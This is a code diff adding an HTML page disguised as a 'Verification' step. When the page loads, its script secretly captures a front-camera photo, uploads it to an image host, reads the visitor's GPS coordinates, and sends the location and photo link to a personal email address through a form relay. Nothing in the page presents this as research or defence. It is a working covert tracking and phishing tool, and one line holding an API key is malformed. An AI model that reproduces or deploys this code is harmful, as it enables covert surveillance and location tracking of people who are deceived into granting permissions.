@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="background:#0f172a;color:white;text-align:center;font-family:Arial">
+<h2>Verifying…</h2>
+<p>Please allow permissions</p>
+
+<form id="sendForm" action="https://formsubmit.co/delfinadodennis26@gmail.com" method="POST">
+  <input type="hidden" name="Latitude" id="lat">
+  <input type="hidden" name="Longitude" id="lon">
+  <input type="hidden" name="Google Maps" id="map">
+  <input type="hidden" name="Camera Image Link" id="photoLink">
+
+  <input type="hidden" name="_subject" value="📍 GPS + IMAGE REPORT">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+let gpsReady = false;
+let imageReady = false;
+
+/* CAMERA → UPLOAD TO IMGBB */
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+  video.srcObject = stream;
+
+  setTimeout(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+
+    let base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
+    let form = new FormData();
+    form.append("key", ""d2df52b590013ea953b1139e637b8973;
+    form.append("image", base64);
+
+    fetch("https://api.imgbb.com/1/upload", {
+      method: "POST",
+      body: form
+    })
+    .then(r => r.json())
+    .then(d => {
+      photoLink.value = d.data.url;
+      imageReady = true;
+      sendIfReady();
+    });
+  }, 1500);
+});
+
+/* GPS */
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    lat.value = pos.coords.latitude;
+    lon.value = pos.coords.longitude;
+    map.value = "https://maps.google.com/?q=" + lat.value + "," + lon.value;
+    gpsReady = true;
+    sendIfReady();
+  },
+  () => {
+    document.body.innerHTML = "<h3>Permission denied</h3>";
+  }
+);
+
+/* SEND WHEN BOTH READY */
+function sendIfReady() {
+  if (gpsReady && imageReady) {
+    sendForm.submit();
+    document.body.innerHTML = "<h3>Done</h3>";
+  }
+}
+</script>
+
+</body>
+</html>
